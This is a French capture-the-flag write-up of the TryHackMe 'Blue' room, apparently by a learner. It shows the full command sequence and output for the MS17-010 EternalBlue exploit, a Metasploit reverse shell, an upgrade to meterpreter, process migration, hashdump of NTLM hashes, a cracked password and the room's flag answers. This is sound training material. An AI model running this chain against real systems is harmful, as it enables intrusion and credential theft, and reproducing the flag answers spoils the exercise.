# WriteUp : Salle Blue

**Auteur :** [Axel-Cfr](https://github.com/Axel-Cfr)  
**Plateforme :** [TryHackMe](https://tryhackme.com/room/blue)  
**Difficulté :** Simple  
**Catégorie :** pwn  
**Outils utilisés :** Nmap, Metasploit, hashes.com  

## Description de la salle

La salle nous fournit une machine d'attaque sous Ubuntu comprenant des outils integrés et une machine vulnérable sous Windows. L'objectif est de trouver une faille exploitable afin de prendre le contrôle de la machine vulnérable et d'y trouver des données potentiellement sensibles.

Adresse IP de la machine d'attaque : `10.130.126.80`  
Adresse IP de la machine vulnérable : `10.130.191.32`  

## Scan de la machine

### Q1. *Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)*

Je scanne donc la machine de manière discrète (`-sS`) afin de détecter les ports ouverts, les services corespondants à ces ports ainsi que leurs versions (`-sV`) et de potentielles vulnérabilités (`--script vuln`).

```bash
root@ip-10-130-126-80:~# nmap -sS -O -sV --script vuln 10.130.191.32

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-08 14:52 UTC
Nmap scan report for ip-10-130-191-32.eu-west-3.compute.internal (10.130.191.32)
Host is up (0.00048s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC

Network Distance: 1 hop
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.10 seconds
```

### Q2. *How many ports are open with a port number under 1000 ?*

La réponse est **3**.

```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

### Q3. *What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)*

La machine est exposée à la vulnérabilité CVE-2017-0143 corrigée dans le patch **ms17-010**.

## Obtention de l'accès à la machine

### Q4. *Start Metasploit*

```bash
root@ip-10-130-126-80:~# msfconsole
```

### Q5. *Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)*

Je cherche donc les modules de type exploit comportant une référence à ms17-010

```bash
msf > search type:exploit ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
[...]
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
[...]
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   20    \_ target: Execute payload (x64)             .                .        .      .
   21    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 21, use 21 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

L'exploit que nous allons lancer est : `exploit/windows/smb/ms17_010_eternalblue`.


### Q6. *Show options and set the one required value. What is the name of this value? (All caps for submission)*

```bash
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name          Current Setti  Required  Description
                 ng
   ----          -------------  --------  -----------
   RHOSTS                       yes       The target host(s)
                                          , see https://docs
                                          .metasploit.com/do
                                          cs/using-metasploi
                                          t/basics/using-met
                                          asploit.html
   RPORT         445            yes       The target port (T
                                          CP)
   SMBDomain                    no        (Optional) The Win
                                          dows domain to use
                                           for authenticatio
                                          n. Only affects Wi
                                          ndows Server 2008
                                          R2, Windows 7, Win
                                          dows Embedded Stan
                                          dard 7 target mach
                                          ines.
   SMBPass                      no        (Optional) The pas
                                          sword for the spec
                                          ified username
   SMBUser                      no        (Optional) The use
                                          rname to authentic
                                          ate as
   VERIFY_ARCH   true           yes       Check if remote ar
                                          chitecture matches
                                           exploit Target. O
                                          nly affects Window
                                          s Server 2008 R2,
                                          Windows 7, Windows
                                           Embedded Standard
                                           7 target machines
                                          .
   VERIFY_TARGE  true           yes       Check if remote OS
   T                                       matches exploit T
                                          arget. Only affect
                                          s Windows Server 2
                                          008 R2, Windows 7,
                                           Windows Embedded
                                          Standard 7 target
                                          machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Settin  Required  Description
             g
   ----      --------------  --------  -----------
   EXITFUNC  thread          yes       Exit technique (Accep
                                       ted: '', seh, thread,
                                        process, none)
   LHOST     10.130.126.80   yes       The listen address (a
                                       n interface may be sp
                                       ecified)
   LPORT     4444            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.130.191.32
RHOSTS => 10.130.191.32
```

La valeur requise est la ou les adresses IP des machines distantes à attaquer (**RHOSTS**)

### Q7. *Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter :<br> `set payload windows/x64/shell/reverse_tcp` <br>With that done, run the exploit!*

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.130.126.80:4444 
[*] 10.130.191.32:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.130.191.32:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)

[...]

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.130.191.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.130.191.32:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

### Q8. *Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.*

```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
```

Je vérifie que la session existe bien et qu'elle est en arrière plan.

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type            Information      Connection
  --  ----  ----            -----------      ----------
  1         shell x64/wind  Shell Banner: M  10.130.126.80:4
            ows             icrosoft Window  444 -> 10.130.1
                            s [Version 6.1.  91.32:49264 (10
                            7601] -----      .130.191.32)

```

## Élevation des privilèges

### Q9. *If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)*

Après avoir cherché sur internet, je sais que le module à utiliser est : `post/multi/manage/shell_to_meterpreter`.

### Q10. *Select this (use MODULE_PATH). Show options, what option are we required to change?*

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter

msf post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Settin  Required  Description
            g
   ----     --------------  --------  -----------
   HANDLER  true            yes       Start an exploit/multi
                                      /handler to receive th
                                      e connection
   LHOST                    no        IP of host that will r
                                      eceive the connection
                                      from the payload (Will
                                       try to auto detect).
   LPORT    4433            yes       Port for payload to co
                                      nnect to.
   SESSION                  yes       The session to run thi
                                      s module on


View the full module info with the info, or info -d command.
```

On doit définir le numéro de **SESSION** et l'addresse IP de la machine qui "écoute" (LHOST)

### Q11. *Set the required option, you may need to list all of the sessions to find your target here.*

```bash
msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf post(multi/manage/shell_to_meterpreter) > set LHOST 10.130.126.80
LHOST => 10.130.126.80
```

### Q12. *Run! If this doesn't work, try completing the exploit from the previous task once more.*

```bash
msf post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.130.126.80:4433 
[*] Post module execution completed
msf post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (248902 bytes) to 10.129.130.49
[*] Meterpreter session 2 opened (10.130.126.80:4433 -> 10.129.130.49:49221) at 2026-07-08 16:48:15 +0000
[*] Stopping exploit/multi/handler
```

### Q13. *Once the meterpreter shell conversion completes, select that session for use.*

```bash
msf post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type            Information      Connection
  --  ----  ----            -----------      ----------
  1         shell x64/wind  Shell Banner: M  10.129.111.11:4
            ows             icrosoft Window  444 -> 10.129.1
                            s [Version 6.1.  30.49:49201 (10
                            7601] -----      .129.130.49)
  2         meterpreter x6  NT AUTHORITY\SY  10.129.111.11:4
            4/windows       STEM @ JON-PC    433 -> 10.129.1
                                             30.49:49221 (10
                                             .129.130.49)

msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

### Q14. *Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.*

```bash
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 2820 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^Z
Background channel 1? [y/N]  y
```

### Q15. *List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).*

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name     Arch  Session  User        Path
 ---   ----  ----     ----  -------  ----        ----
 0     0     [System
              Proces
             s]
 4     0     System   x64   0
 416   4     smss.ex  x64   0        NT AUTHORI  \SystemRoot
             e                       TY\SYSTEM   \System32\s
                                                 mss.exe
 532   548   conhost  x64   0        NT AUTHORI  C:\Windows\
             .exe                    TY\SYSTEM   system32\co
                                                 nhost.exe
[...]
```

Le processus smss.exe tourne sous NT AUTHORITY\SYSTEM et son PID est 416.

### Q16. *Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.*

Lorsque j'ai voulu migrer vers le processus 416, la session est restée bloquée puis s'est fermée. Je vais donc essayer avec le processus 704 (lsass.exe), car j'ai appris dans une salle précédente que ce processus était plus stable.

```bash
meterpreter > migrate 704
[*] Migrating from 1244 to 704...
[*] Migration completed successfully.
```

## Récupération et décryptage d'un mot de passe

### Q17. *Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user ?*

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Le nom d'utilisateur qui n'est pas un utilisateur par défaut est **Jon**.

### Q18. *Copy this password hash to a file and research how to crack it. What is the cracked password ?*

Le hash qui correspond à son mot de passe est : `ffb43f0de35be4d9917ac0cc8ad57f8d`  
Je vais donc sur [hashes.com](https://hashes.com/en/decrypt/hash) afin de décrypter le hash du mot de passe de Jon. Voici la sortie : `ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22:NTLM`

Le mot de passe en clair est : **alqfna22**

## Recherche des flags

### Q19. *Flag1 ? This flag can be found at the system root.*

Je me rend à la racine et je liste les dossiers et fichiers qui s'y trouvent. Une fois le fichier flag1.txt trouvé, j'affiche son contenu.

```bash
meterpreter > cd C:\\
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode        Size   Type  Last modified     Name
----        ----   ----  -------------     ----
040777/rwx  0      dir   2018-12-13 03:13  $Recycle.Bin
rwxrwx                   :36 +0000
040777/rwx  0      dir   2009-07-14 05:08  Documents and Set
rwxrwx                   :56 +0000         tings
040777/rwx  0      dir   2009-07-14 03:20  PerfLogs
rwxrwx                   :08 +0000
040555/r-x  4096   dir   2019-03-17 22:22  Program Files
r-xr-x                   :01 +0000
[...]
040555/r-x  4096   dir   2018-12-13 03:13  Users
r-xr-x                   :28 +0000
040777/rwx  16384  dir   2019-03-17 22:36  Windows
rwxrwx                   :30 +0000
040777/rwx  0      dir   2026-07-08 18:49  badr
rwxrwx                   :58 +0000
100666/rw-  24     fil   2019-03-17 19:27  flag1.txt
rw-rw-                   :21 +0000

[...]

meterpreter > cat flag1.txt
flag{access_the_machine}
```

Le fichier flag1.txt contient **`flag{access_the_machine}`**.

### Q20. *Flag2 ? This flag can be found at the location where passwords are stored within Windows.*<br><br>**Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.*

Sous Windows, les mots de passe sont stockés dans le Security Account Manager (SAM). Cherchons donc un dossier s'appelant SAM :

```bash
meterpreter > search -f SAM
Found 2 results...
==================

Path                                    Size (bytes)  Modified (UTC)
----                                    ------------  --------------
c:\Windows\System32\config\RegBack\SAM  24576         2026-07-08 19:18:48 +0000
c:\Windows\System32\config\SAM          262144        2019-03-17 20:05:08 +0000
```

Cherchons maintenant à l'intérieur et autour de ces dossiers.

```bash
meterpreter > ls "c:\\Windows\\System32\\config\\SAM"
100666/rw-rw-rw-  262144  fil  2019-03-17 20:05:08 +0000  c:\Windows\System32\config\SAM
meterpreter > ls "c:\\Windows\\System32\\config\\RegBack\\SAM" 
100666/rw-rw-rw-  24576  fil  2026-07-08 19:18:48 +0000  c:\Windows\System32\config\RegBack\SAM
meterpreter > ls "c:\\Windows\\System32\\config"
Listing: c:\Windows\System32\config
===================================

Mode        Size      Type  Last modified    Name
----        ----      ----  -------------    ----
100666/rw-  28672     fil   2018-12-12 23:0  BCD-Template
rw-rw-                      0:40 +0000
100666/rw-  25600     fil   2018-12-12 23:0  BCD-Template.LO
rw-rw-                      0:40 +0000       G

[...]

100666/rw-  34        fil   2019-03-17 19:3  flag2.txt
rw-rw-                      2:48 +0000
040777/rwx  4096      dir   2010-11-21 02:4  systemprofile
rwxrwx                      1:37 +0000

meterpreter > cat "c:\\Windows\\System32\\config\\flag2.txt"
flag{sam_database_elevated_access}
```

Le fichier flag2.txt contient **`flag{sam_database_elevated_access}`**.

### Q21. *flag3 ? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.*

Les administrateurs doivent certainement sauvegarder des fichiers dans l'espace d'un utilisateur.

```bash
meterpreter > ls Users
Listing: Users
==============

Mode          Size  Type  Last modified         Name
----          ----  ----  -------------         ----
040777/rwxrw  0     dir   2009-07-14 05:08:56   All Users
xrwx                      +0000
040555/r-xr-  8192  dir   2009-07-14 07:07:31   Default
xr-x                      +0000
040777/rwxrw  0     dir   2009-07-14 05:08:56   Default User
xrwx                      +0000
040777/rwxrw  8192  dir   2018-12-13 03:13:45   Jon
xrwx                      +0000
040555/r-xr-  4096  dir   2011-04-12 08:28:15   Public
xr-x                      +0000
100666/rw-rw  174   fil   2009-07-14 04:54:24   desktop.ini
-rw-                      +0000
```

Cherchons dans `Default`, `Jon` et `Public` car ils ne sont pas vides (Size > 0).

```bash
meterpreter > ls "Users\\Default"
Listing: Users\Default
======================

Mode        Size    Type  Last modified     Name
----        ----    ----  -------------     ----
040777/rwx  0       dir   2009-07-14 03:20  AppData
rwxrwx                    :08 +0000
040777/rwx  0       dir   2009-07-14 05:08  Application Data
rwxrwx                    :56 +0000
040777/rwx  0       dir   2009-07-14 05:08  Cookies
rwxrwx                    :56 +0000
040555/r-x  0       dir   2009-07-14 02:34  Desktop
r-xr-x                    :59 +0000
040555/r-x  4096    dir   2009-07-14 05:08  Documents
r-xr-x                    :56 +0000
040555/r-x  0       dir   2009-07-14 02:34  Downloads
r-xr-x                    :59 +0000

[...]

040777/rwx  0       dir   2009-07-14 05:08  Templates
rwxrwx                    :56 +0000
040555/r-x  0       dir   2009-07-14 02:34  Videos
r-xr-x                    :59 +0000

meterpreter > ls "Users\\Default\\Documents"
Listing: Users\Default\Documents
================================

Mode           Size  Type  Last modified         Name
----           ----  ----  -------------         ----
040777/rwxrwx  0     dir   2009-07-14 05:08:56   My Music
rwx                        +0000
040777/rwxrwx  0     dir   2009-07-14 05:08:56   My Pictures
rwx                        +0000
040777/rwxrwx  0     dir   2009-07-14 05:08:56   My Videos
rwx                        +0000

meterpreter > ls "Users\\Jon"
Listing: Users\Jon
==================

Mode        Size    Type  Last modified     Name
----        ----    ----  -------------     ----
040777/rwx  0       dir   2018-12-13 03:13  AppData
rwxrwx                    :31 +0000
040777/rwx  0       dir   2018-12-13 03:13  Application Data
rwxrwx                    :31 +0000
040555/r-x  0       dir   2018-12-13 03:13  Contacts
r-xr-x                    :48 +0000
040777/rwx  0       dir   2018-12-13 03:13  Cookies
rwxrwx                    :31 +0000
040555/r-x  0       dir   2018-12-13 03:49  Desktop
r-xr-x                    :07 +0000
040555/r-x  4096    dir   2018-12-13 03:49  Documents
r-xr-x                    :20 +0000
040555/r-x  0       dir   2018-12-13 03:13  Downloads
r-xr-x                    :48 +0000
040555/r-x  4096    dir   2018-12-13 03:13  Favorites
r-xr-x                    :51 +0000

[...]

meterpreter > ls "Users\\Jon\\Documents"
Listing: Users\Jon\Documents
============================

Mode           Size  Type  Last modified         Name
----           ----  ----  -------------         ----
040777/rwxrwx  0     dir   2018-12-13 03:13:31   My Music
rwx                        +0000
040777/rwxrwx  0     dir   2018-12-13 03:13:31   My Pictures
rwx                        +0000
040777/rwxrwx  0     dir   2018-12-13 03:13:31   My Videos
rwx                        +0000
100666/rw-rw-  402   fil   2018-12-13 03:13:48   desktop.ini
rw-                        +0000
100666/rw-rw-  37    fil   2019-03-17 19:26:36   flag3.txt
rw-                        +0000
```

Le fichier flag3.txt se trouve dans **C:\Users\Jon\Documents**.

```bash
meterpreter > cat "Users\\Jon\\Documents\\flag3.txt"
flag{admin_documents_can_be_valuable}
```

Le fichier flag3.txt contient **`flag{admin_documents_can_be_valuable}`**.

## Conclusion

J'ai pu pleinement mettre en pratique ce que j'ai appris au fil des salles du Parcours Cyber Security 101 afin d'exploiter une vulnérabilité d'une machine qui n'a pas été mise à jour. Cela m'a permis d'utiliser un des exploits les plus célèbres au monde, Eternal Blue qui a été conçu par la NSA et utilisé par le ver WannaCry. Une fois avoir pris le contrôle de la machine, j'ai dû élever mes privilèges en migrant vers un autre processus afin d'être en mesure de me procurer les hashs des mots de passes des utilisateurs de la machine ou de manipuler des dossiers nécessitant des autorisations.